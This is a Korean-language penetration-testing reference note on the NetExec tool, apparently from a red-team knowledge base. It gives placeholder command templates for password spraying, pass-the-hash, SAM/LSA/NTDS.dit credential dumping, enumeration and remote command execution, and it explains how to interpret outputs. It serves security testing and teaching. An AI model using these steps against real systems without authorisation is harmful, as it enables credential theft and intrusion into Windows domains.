---
tags:
  - 환경/windows
  - 서비스/smb
  - 기능/열거
  - 기능/인증검증
실행환경: ["Linux"]
필요권한: ["덤프와 원격 실행 기능은 대상 관리자 권한"]
필요조건: ["대상 서비스에 맞는 인증 정보"]
결과: ["인증 결과", "권한 정보", "정보", "해시와 LSA secret", "명령 출력"]
---

# netexec

## 도구 개요

NetExec은 SMB·WinRM·LDAP·RDP 같은 여러 서비스에서 인증을 일괄 검증하고 공유·객체 열거, 자격 증명 수집과 원격 명령을 수행하는 도구다. 여러 호스트와 계정의 서비스별 접근 범위를 빠르게 비교할 때 유용하며, 인증 성공·관리자 표시·실제 명령 실행은 서로 다른 결과다.

## 필요한 입력과 실행 환경

- 실행 환경: Linux
- 입력: 프로토콜, 단일 호스트·CIDR·대상 목록
- 인증 입력: 도메인/로컬 사용자와 비밀번호·NTLM hash 또는 사용자·비밀번호 목록
- 기능별 조건: dump와 원격 명령 실행에는 대상에서 관리자급 권한 필요

## 표준 사용법

```shell
nxc <protocol> <target> -u <user> -p <password>
nxc <protocol> <target> -u <user> -H <ntlm_hash>
```

프로토콜별 옵션이 다르므로 먼저 `nxc <protocol> --help`로 확인한다.

```shell
nxc smb --help
nxc ldap --help
```

## 대표 예시

### SMB 인증 확인

```shell
nxc smb <TARGET> -u <USER> -p '<PASSWORD>'
```

SMB 인증 가능 여부와 권한 단서를 확인한다. 로컬 계정이면 `--local-auth`를 같이 쓴다.

### 로컬 관리자 권한 확인

```shell
nxc smb <TARGET> --local-auth -u <LOCAL_USER> -p '<PASSWORD>'
```

대상 로컬 계정이 Administrators에 추가되었는지 확인할 때 사용한다. `Pwn3d!` 또는 admin 표시가 나오면 SMB 기준 로컬 관리자 권한으로 원격 작업이 가능하다는 의미다.

### 비밀번호 스프레이

```shell
nxc smb <TARGET_CIDR> -u users.txt -p '<PASSWORD>' --continue-on-success
```

동일한 비밀번호를 여러 사용자에게 확인할 때 사용한다. 잠금 정책을 먼저 확인하고 속도를 낮춰야 한다.

### Pass the Hash

```shell
nxc smb <TARGET> -u Administrator -H <LM_HASH>:<NTLM_HASH>
```

NTLM 해시로 SMB 인증을 시도한다. LM 해시가 없으면 NT 해시만 넣는 형태도 도구 버전에 따라 가능하다.

### SMB 공유 열거

```shell
nxc smb <TARGET> -u <USER> -p '<PASSWORD>' --shares
```

접근 가능한 공유와 권한을 확인한다.

### 로컬 SAM/LSA 덤프

```shell
nxc smb <TARGET> -u Administrator -p '<PASSWORD>' --sam
nxc smb <TARGET> -u Administrator -p '<PASSWORD>' --lsa
nxc smb <TARGET> --local-auth -u <LOCAL_ADMIN> -p '<PASSWORD>' --lsa
```

관리자 권한이 있을 때 로컬 계정 해시 또는 LSA secret을 확인한다.

마지막 명령은 대상 호스트의 로컬 SAM 계정으로 인증한다. 도메인 계정으로 추출할 때는 `-d <DOMAIN>`을 사용하고 `--local-auth`를 붙이지 않는다.

`--lsa` 출력은 값의 형식에 따라 구분한다.

- `<DOMAIN>\<USER>:<PLAINTEXT_PASSWORD>`는 AutoLogon 등 계정명이 연결된 평문 secret이므로 [[Windows LSA Secrets 추출]]에서 계정 범위를 확인한다.
- `<HOST>$:plain_password_hex:<HEX>`는 컴퓨터 계정 secret의 16진수 표현이며 사용자 평문 비밀번호가 아니다.
- `$DCC2$...`는 cached domain logon hash이므로 [[Windows Cached Domain Credentials 추출]]에서 별도로 해석한다.
- 평문 AD 계정을 얻었으면 [[AD 계정의 디렉터리 복제 권한 확인]]을 포함해 실제 객체 권한을 확인한다.

### NTDS.dit 덤프

```shell
nxc smb <TARGET> -u <USER> -p '<PASSWORD>' --ntds
```

도메인 컨트롤러에서 도메인 계정 해시를 수집할 때 사용한다. 높은 권한이 필요하다.

### WinRM 접근 확인

```shell
nxc winrm <TARGET> -u <USER> -p '<PASSWORD>'
```

WinRM 로그인이 가능한 계정을 찾는다. 성공하면 Evil-WinRM 같은 도구로 셸 접근을 이어갈 수 있다.

### LDAP 사용자/도메인 열거

```shell
nxc ldap <TARGET> -u <USER> -p '<PASSWORD>' --users
```

LDAP 인증 후 사용자 목록 등 AD 정보를 열거한다.

### 원격 명령 실행

```shell
nxc smb <TARGET> -u Administrator -p '<PASSWORD>' -x 'whoami'
```

SMB 원격 실행이 가능한 권한일 때 명령을 실행한다. PowerShell 명령은 버전에 따라 `-X`를 사용한다.

## 주요 옵션

| 옵션 | 의미 |
| --- | --- |
| `-u <user>` | 사용자 또는 사용자 목록 |
| `-p <password>` | 비밀번호 또는 비밀번호 목록 |
| `-H <hash>` | NTLM 해시 인증 |
| `--local-auth` | 도메인이 아닌 대상 로컬 계정으로 인증 |
| `--continue-on-success` | 성공 후에도 다음 조합 계속 시도 |
| `--shares` | SMB 공유 열거 |
| `--sessions` | SMB 세션 열거 |
| `--users` | 사용자 열거. 프로토콜별 지원 여부 확인 필요 |
| `--sam` | 로컬 SAM 덤프 |
| `--lsa` | LSA secret 덤프 |
| `--ntds` | 도메인 NTDS 덤프 |
| `-x <cmd>` | cmd.exe 기반 원격 명령 실행 |
| `-X <ps>` | PowerShell 기반 원격 명령 실행 |
| `-M <module>` | NetExec 모듈 실행 |
| `--help` | 프로토콜별 도움말 확인 |

## 도구 고유 출력

| 출력/상태 | 의미 | 다음 행동 |
|---|---|---|
| credential valid | 프로토콜별 인증 성공 | 접근 가능한 서비스와 권한 범위 확인 |
| `Pwn3d!` 또는 admin 표시 | 관리자급 작업 가능 | exec, dump, share 접근, lateral movement 가능성 확인 |
| share/user/policy 출력 | 열거 성공 | 서비스 문서의 후속 공격 후보와 연결 |
| `Dumping LSA Secrets`와 `<DOMAIN>\<USER>:<PLAINTEXT_PASSWORD>` | LSA 추출과 계정명이 연결된 평문 secret 복구 | 새 계정의 도메인·서비스·객체 권한 확인 |
| `$DCC2$...` | 캐시된 도메인 로그온 hash 추출 | 오프라인 검증 대상으로 분리 |
| lockout/auth/connection 오류 | 계정 정책, credential, 네트워크 문제 | 도메인 형식, 프로토콜, 포트, 시도 빈도 확인 |

## 버전과 환경 차이

- 현재 NetExec CLI는 `nxc <protocol> <target>` 형식이다. 설치된 package가 다른 실행 파일명을 제공하거나 이전 예시가 남아 있으면 `nxc --version`과 `nxc <protocol> --help`로 실제 문법을 확인한다.
- protocol module과 option 지원 범위는 릴리스마다 달라질 수 있다. 특히 dump, exec, LDAP 옵션은 명령을 실행하기 전에 해당 protocol 도움말을 기준으로 선택한다.

## 관련 공격기법

- [[AD 비밀번호 정책 열거 및 조회]]
- [[인증 전 AD 사용자 목록 수집]]
- [[내부 AD Password Spraying]]
- [[인증 후 AD 사용자와 컴퓨터 객체 열거]]
- [[AD 고권한 그룹과 중첩 구성원 열거]]
- [[원격 Windows 로그온 사용자와 로컬 관리자 단서 열거]]
- [[원격 비밀번호 공격]]
- [[Pass the Hash]]
- [[Windows SAM SECURITY SYSTEM 덤프]]
- [[Windows LSA Secrets 추출]]
- [[Windows Cached Domain Credentials 추출]]
- [[AD 계정의 디렉터리 복제 권한 확인]]
- [[NTDS.dit 덤프]]
- [[WinRM 원격 PowerShell 세션]]

## 참고 링크

- [NetExec protocol 사용법](https://www.netexec.wiki/getting-started/selecting-and-using-a-protocol)
